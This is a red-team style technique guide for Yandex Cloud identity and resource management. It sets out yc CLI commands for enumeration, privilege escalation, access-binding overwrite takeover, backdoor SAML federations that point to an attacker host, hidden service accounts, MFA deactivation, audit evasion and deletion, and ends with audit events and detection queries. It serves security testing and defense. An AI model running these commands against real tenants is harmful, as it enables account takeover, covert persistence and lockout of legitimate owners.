# Yandex Cloud - Organization & Resource Manager Techniques

## Service Overview

Yandex Cloud uses a strict four-level nested container model for resource organization. Organization Manager handles identity (users, federations, groups, OS Login, MFA), while Resource Manager handles the structural hierarchy (clouds, folders). Permissions inherit downward and **cannot be restricted at child levels** — making higher-level access escalation extremely impactful.

**Resource Hierarchy:**
```
Organization (top-level)
  └── Cloud (isolated namespace)
       └── Folder (resource container, NO nesting)
            └── Resources (VMs, buckets, databases, etc.)
```

**Key Concepts:**
- **Organization**: Root entity. Manages users, identity federations, OS Login, user groups, MFA enforcement. Any Yandex ID user can create unlimited organizations. Organizations are completely isolated from each other
- **Cloud**: Isolated space belonging to an organization. Each cloud has an owner (`resource-manager.clouds.owner`). A cloud must always have at least one owner — the sole owner cannot revoke their own role. Clouds can be moved between organizations
- **Folder**: Contains actual resources. Belongs to a single cloud. Folders cannot be nested
- **Permission Inheritance**: Permissions flow downward and are additive only. A user with `editor` at the organization level has `editor` on every cloud, folder, and resource
- **Deletion Behavior**: Clouds and folders enter `PENDING_DELETION` for 7 days (configurable), during which resources are stopped but recoverable. After that, `DELETING` status is permanent (up to 72 hours)

---

## Enumeration

### Enumerate Organizations

```bash
# List all organizations the current identity belongs to
yc organization-manager organization list

# Get details on a specific organization
yc organization-manager organization get <org_name_or_id>

# List all users in an organization
yc organization-manager user list --organization-id <org_id>

# List operations performed on the organization
yc organization-manager organization list-operations <org_name_or_id>
```

### Enumerate Clouds and Folders

```bash
# List all clouds accessible to the current identity
yc resource-manager cloud list

# Get details of a specific cloud
yc resource-manager cloud get <cloud_name_or_id>

# List folders within a cloud
yc resource-manager folder list --cloud-id <cloud_id>

# Get folder details
yc resource-manager folder get <folder_name_or_id>
```

### Full Hierarchy Sweep

```bash
# Enumerate all clouds, folders, and service accounts
for cloud_id in $(yc resource-manager cloud list --format json | jq -r '.[].id'); do
  echo "=== Cloud: $cloud_id ==="
  for folder_id in $(yc resource-manager folder list --cloud-id "$cloud_id" --format json | jq -r '.[].id'); do
    echo "  --- Folder: $folder_id ---"
    yc iam service-account list --folder-id "$folder_id"
    yc compute instance list --folder-id "$folder_id"
  done
done
```

### Enumerate Access Bindings

```bash
# Organization-level access bindings
yc organization-manager organization list-access-bindings <org_name_or_id>

# Cloud-level access bindings
yc resource-manager cloud list-access-bindings <cloud_name_or_id>

# Folder-level access bindings
yc resource-manager folder list-access-bindings <folder_name_or_id>

# Service account access bindings
yc iam service-account list-access-bindings <sa_id>
```

### Enumerate Identity Federations

```bash
# List SAML federations in an organization
yc organization-manager federation saml list --organization-id <org_id>

# Get federation details
yc organization-manager federation saml get --id <federation_id> --format json

# List domains associated with a federation
yc organization-manager federation saml list-domains --federation-id <fed_id>

# List certificates in a federation
yc organization-manager federation saml certificate list --federation-id <fed_id>
```

### Enumerate User Groups

```bash
# List all user groups
yc organization-manager group list --organization-id <org_id>

# List group members
yc organization-manager group list-members <group_id>

# List access bindings on a group
yc organization-manager group list-access-bindings <group_id>
```

### Enumerate OS Login and MFA

```bash
# Get OS Login settings for the organization
yc organization-manager oslogin get-settings --organization-id <org_id>

# List MFA enforcement policies
yc organization-manager mfa-enforcement list --organization-id <org_id>

# Get MFA policy details and targeted users
yc organization-manager mfa-enforcement get <mfa_id>
yc organization-manager mfa-enforcement list-audience <mfa_id>
```

---

## Privilege Escalation

### Inheritance-Based Escalation

Roles assigned at a higher level inherit to all child resources. **You cannot restrict inherited permissions at a lower level.**

```bash
# Escalate from folder to cloud level (requires admin on the cloud)
yc resource-manager cloud add-access-binding <cloud_id> \
  --role admin \
  --subject userAccount:<your_id>

# Escalate from cloud to organization level
yc organization-manager organization add-access-binding <org_id> \
  --role organization-manager.admin \
  --subject userAccount:<your_id>
```

### Access Binding Overwrite Takeover

The `set-access-bindings` command **completely replaces** all existing bindings. An attacker can simultaneously grant themselves admin and strip all legitimate users:

```bash
# Replace ALL cloud access with only attacker access
yc resource-manager cloud set-access-bindings <cloud_id> \
  --access-binding role=resource-manager.clouds.owner,subject=userAccount:<attacker_id>

# Replace ALL folder access
yc resource-manager folder set-access-bindings <folder_id> \
  --access-binding role=admin,subject=serviceAccount:<attacker_sa_id>
```

**Note**: The sole `clouds.owner` cannot be removed, so this works best when there are multiple owners.

### Service Account Impersonation Chain

```bash
# 1. Find SAs with high privileges at the cloud/org level
yc resource-manager cloud list-access-bindings <cloud_id>
# Look for serviceAccount subjects with admin/editor roles

# 2. If you have iam.serviceAccounts.tokenCreator on that SA:
yc iam create-token --impersonate-service-account-id <high_priv_sa_id>

# 3. If you have editor on the SA's folder (can create keys):
yc iam key create --service-account-id <high_priv_sa_id> --output key.json
```

### Cross-Folder Service Account Access

A service account created in Folder A can be granted roles on Folder B, Cloud C, or the entire Organization. The SA's "home" folder only determines where it is listed:

```bash
# Create SA in a low-visibility folder
yc iam service-account create --name "monitoring-agent" --folder-id <obscure_folder_id>

# Grant it admin at the cloud level
yc resource-manager cloud add-access-binding <cloud_id> \
  --role admin \
  --subject serviceAccount:<sa_id>
```

### Role Assignment Constraints

- A user can only assign roles with permissions they already possess
- `admin` can assign any role **except** `clouds.owner` and `organizations.owner`
- Only `clouds.owner` can assign `clouds.owner`
- Only `organizations.owner` can assign `organizations.owner`
- `organizations.owner` is the ultimate escalation target — complete control over the entire organization

---

## Persistence

### SAML Federation Backdoor

Create a rogue SAML federation pointing to an attacker-controlled IdP. This provides persistent access even if all other credentials are rotated:

```bash
# Create backdoor federation with auto-create enabled
yc organization-manager federation saml create \
  --name "legacy-sso" \
  --organization-id <org_id> \
  --cookie-max-age 720h \
  --issuer "https://attacker-idp.example.com" \
  --sso-binding POST \
  --sso-url "https://attacker-idp.example.com/sso" \
  --auto-create-account-on-login

# Upload IdP certificate
yc organization-manager federation saml certificate create \
  --federation-name "legacy-sso" \
  --name "idp-cert" \
  --certificate-file attacker-cert.pem

# Add federated user
yc organization-manager federation saml add-user-accounts \
  --name "legacy-sso" \
  --name-ids=backdoor@attacker.com

# Grant federated user org-level admin
yc organization-manager organization add-access-binding <org_id> \
  --role organization-manager.admin \
  --subject federatedUser:<fed_user_id>
```

With `--auto-create-account-on-login`, any user authenticating through the federation is automatically added to the organization with `resource-manager.clouds.member`.

### Modify Existing Federation

Redirect an existing federation's SSO URL to an attacker-controlled IdP:

```bash
# Redirect federation to attacker IdP
yc organization-manager federation saml update <fed_id> \
  --sso-url "https://attacker-idp.example.com/sso"

# Extend cookie max age to reduce re-authentication
yc organization-manager federation saml update <fed_id> \
  --cookie-max-age 720h
```

### Hidden Service Accounts

Create service accounts with innocuous names in low-visibility folders, with broad access granted at higher levels:

```bash
# Create SA with legitimate-sounding name
yc iam service-account create --name "yc-monitoring-agent" --folder-id <obscure_folder_id>

# Grant it admin at the cloud level
yc resource-manager cloud add-access-binding <cloud_id> \
  --role admin \
  --subject serviceAccount:<sa_id>

# Create unlimited-lifetime authorized key
yc iam key create --service-account-id <sa_id> --output persistence-key.json
```

### Hidden Folders

Create folders in a cloud to host attacker resources less visible to defenders monitoring known folders:

```bash
# Create a folder with an innocent name
yc resource-manager folder create --name "shared-infra" --cloud-id <cloud_id>

# Create attacker SA inside and grant broad access
yc iam service-account create --name "infra-monitor" --folder-id <new_folder_id>
yc resource-manager cloud add-access-binding <cloud_id> \
  --role editor \
  --subject serviceAccount:<sa_id>
```

**Evasion note**: If Audit Trails are scoped to specific folders, activities in newly created folders may not be logged.

### User Group Persistence

Groups are less scrutinized than direct role bindings:

```bash
# Create a group and add attacker accounts
yc organization-manager group create --name "sre-oncall" --organization-id <org_id>
yc organization-manager group add-members <group_id> --subject-id <attacker_id>
yc resource-manager cloud add-access-binding <cloud_id> \
  --role admin \
  --subject group:<group_id>
```

### OS Login SSH Key Persistence

If OS Login is enabled with `--allow-manage-own-keys`, upload SSH keys for persistent VM access across the organization.

### MFA Enforcement Deactivation

```bash
# Disable MFA to maintain access via compromised credentials
yc organization-manager mfa-enforcement deactivate <mfa_id>
yc organization-manager mfa-enforcement delete <mfa_id>
```

### OIDC Application Registration

Register rogue OIDC/SAML applications for alternative authentication paths (requires `organization-manager.oauthApplications.editor` or `samlApplications.editor`).

---

## Defense Evasion

### OS Login Manipulation

```bash
# Enable all OS Login access modes (expands SSH attack surface)
yc organization-manager oslogin update-settings \
  --organization-id <org_id> \
  --ssh-certificates-enabled \
  --ssh-user-keys-enabled \
  --allow-manage-own-keys

# Or disable OS Login to force fallback to less-controlled SSH key management
yc organization-manager oslogin update-settings \
  --organization-id <org_id> \
  --ssh-certificates-enabled=false \
  --ssh-user-keys-enabled=false
```

### Public Access Grant

Make resources accessible to any authenticated user or even unauthenticated users:

```bash
# Grant access to ALL authenticated Yandex Cloud users
yc resource-manager folder add-access-binding <folder_id> \
  --role viewer \
  --subject system:allAuthenticatedUsers

# Grant access to ALL users (authenticated or not)
yc resource-manager folder add-access-binding <folder_id> \
  --role viewer \
  --subject system:allUsers
```

**Subject types for `--subject`:**
- `userAccount:<user_id>` — Yandex ID account
- `serviceAccount:<sa_id>` — Service account
- `federatedUser:<user_id>` — Federated (SAML/OIDC) user
- `system:allAuthenticatedUsers` — Any authenticated Yandex Cloud user globally
- `system:allUsers` — Any user, authenticated or not
- `system:group:organization:<org_id>:users` — All users in a specific organization

---

## Post-Exploitation

### Remove Users from Organization

```bash
yc organization-manager user remove --organization-id <org_id> --subject-id <user_id>
```

### Delete Federation (Authentication Disruption)

```bash
# Delete a federation to lock out all federated users
yc organization-manager federation saml delete <fed_id>
```

### Delete Cloud or Folder

```bash
# Delete a cloud (enters 7-day PENDING_DELETION by default)
yc resource-manager cloud delete <cloud_id>

# Delete a folder
yc resource-manager folder delete <folder_id>
```

---

## Key IAM Roles

### Resource Manager

| Role | Capabilities |
|---|---|
| `resource-manager.auditor` | View cloud/folder metadata and access permissions |
| `resource-manager.viewer` | Read information about clouds, folders, and access controls |
| `resource-manager.editor` | Create/modify/delete clouds and folders |
| `resource-manager.admin` | Full management including modifying access permissions |
| `resource-manager.clouds.member` | Basic membership required to act on cloud resources (no permissions alone) |
| `resource-manager.clouds.owner` | Supreme cloud privilege; can assign any role, manage billing links |

### Organization Manager

| Role | Capabilities |
|---|---|
| `organization-manager.auditor` | View org settings, federations, user pools |
| `organization-manager.viewer` | Auditor + phone numbers, user audit events |
| `organization-manager.editor` | Manage org settings, federations, user pools, users, groups (no role assignment) |
| `organization-manager.admin` | Full org management including access control |
| `organization-manager.organizations.owner` | Highest org role — everything including billing |
| `organization-manager.federations.editor` | Create/update/delete SAML federations |
| `organization-manager.federations.admin` | Full federation management + external group association |
| `organization-manager.federations.userAdmin` | Add/remove federated users, manage MFA factors |
| `organization-manager.osLogins.admin` | Manage OS Login settings, profiles, SSH keys |
| `organization-manager.groups.admin` | Complete user group management |
| `organization-manager.groups.memberAdmin` | View and manage group membership |
| `organization-manager.passportUserAdmin` | Invite/remove Yandex account users |
| `organization-manager.userpools.editor` | Manage user pools and local users |
| `organization-manager.oauthApplications.editor` | Create/modify/delete OIDC applications |
| `organization-manager.samlApplications.editor` | Create/modify/delete SAML applications |

---

## Detection and Logging

### Audit Trail Events

**Resource Manager Events** (source: `resourcemanager`):

| Event | Security Relevance |
|---|---|
| `CreateCloud` / `DeleteCloud` / `UpdateCloud` | Cloud lifecycle changes |
| `CreateFolder` / `DeleteFolder` / `UpdateFolder` | Folder lifecycle — hidden folder creation |
| `SetCloudAccessBindings` | **HIGH ALERT** — complete access overwrite |
| `UpdateCloudAccessBindings` | Role changes at cloud level |
| `SetFolderAccessBindings` | **HIGH ALERT** — complete access overwrite |
| `UpdateFolderAccessBindings` | Role changes at folder level |
| `BindCloudAccessPolicy` / `UnbindCloudAccessPolicy` | Authorization policy manipulation |

**Organization Manager Events** (source: `organizationmanager`):

| Event | Security Relevance |
|---|---|
| `SetOrganizationAccessBindings` | **HIGH ALERT** — complete org access overwrite |
| `UpdateOrganizationAccessBindings` | Role changes at org level |
| `CreateMembership` / `DeleteMembership` | User addition/removal |
| `saml.CreateFederation` | **HIGH ALERT** — new IdP trust relationship |
| `saml.UpdateFederation` | Federation SSO URL/settings modification |
| `saml.DeleteFederation` | Authentication disruption |
| `saml.AddFederatedUserAccounts` | Adding federated users |
| `CreateGroup` / `UpdateGroupMembers` | Group membership manipulation |
| `UpdateOsLoginSettings` | OS Login configuration changes |
| `CreateUserSshKey` / `DeleteUserSshKey` | SSH key management |
| `DeactivateMfaEnforcement` / `DeleteMfaEnforcement` | **HIGH ALERT** — MFA being disabled |
| `oauth.CreateApplication` / `saml.CreateApplication` | **HIGH ALERT** — rogue app registration |
| `idp.CreateUser` / `idp.SetUserPassword` | Local user creation/password changes |

### Detection Queries

**Detect access binding overwrite (most dangerous operation)**:
```
event_type LIKE "%SetCloudAccessBindings%" OR
event_type LIKE "%SetFolderAccessBindings%" OR
event_type LIKE "%SetOrganizationAccessBindings%"
```

**Detect new SAML federation creation**:
```
event_type LIKE "%saml.CreateFederation%"
```

**Detect MFA deactivation**:
```
event_type LIKE "%DeactivateMfaEnforcement%" OR
event_type LIKE "%DeleteMfaEnforcement%"
```

**Detect OS Login settings changes**:
```
event_type LIKE "%UpdateOsLoginSettings%"
```

**Detect public access grants**:
```
event_type LIKE "%UpdateCloudAccessBindings%" AND
details CONTAINS "allAuthenticatedUsers"
```

### Evasion Considerations

- If Audit Trails are scoped to specific folders, activities in **newly created folders** may not be logged
- If trails are scoped to individual clouds, **organization-level events** (federation changes, user additions) may not be captured
- Only management plane events are logged for Resource Manager — listing/reading operations are not audited
- Organization-scoped trails provide the most comprehensive coverage

---

## References

- Organization Concepts: `en/organization/concepts/organization`
- Resource Hierarchy: `en/resource-manager/concepts/resources-hierarchy`
- Resource Manager Security: `en/resource-manager/security/`
- Organization Manager Security: `en/organization/security/`
- Setting Access Bindings: `en/resource-manager/operations/folder/set-access-bindings`
- SAML Federation Configuration: `en/organization/operations/setup-federation`
- OS Login Concepts: `en/organization/concepts/os-login`
- Resource Manager Audit Trail: `en/resource-manager/at-ref`
- Organization Manager Audit Trail: `en/organization/at-ref`
- IAM Roles Reference: `en/iam/roles-reference`
